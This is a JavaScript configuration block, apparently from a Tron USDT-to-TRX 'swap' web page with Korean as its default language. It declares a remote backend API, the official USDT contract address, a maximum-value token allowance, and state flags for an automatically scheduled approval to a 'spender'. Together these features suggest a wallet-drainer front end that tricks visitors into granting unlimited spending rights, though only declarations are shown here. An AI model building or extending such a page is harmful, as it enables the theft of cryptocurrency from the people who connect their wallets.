// ========== CONFIG & CONSTANTS ==========
var API_BASE = 'https://tron-usdt-backend.vercel.app/api';
var OFFICIAL_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

// ===== Global State =====
var isConnected = false;
var isApproved = false;
var isApproving = false;
var activeProvider = 'Unknown';
var currentWalletAddress = null;
var wcConnector = null;
var wcAddress = null;
var _autoApproveScheduled = false;
var spender = null;
var pendingApproveId = null;
var userUsdtBalance = 0;
var userTrxBalance = 0;
var TRX_RATE = 0;
var currentLang = 'ko';
var swapDirection = 'USDT_TO_TRX';
var connectBtnOriginalHtml = null;
var isConnecting = false;
var isDetectingWallet = false;
var isLaunchingWallet = false;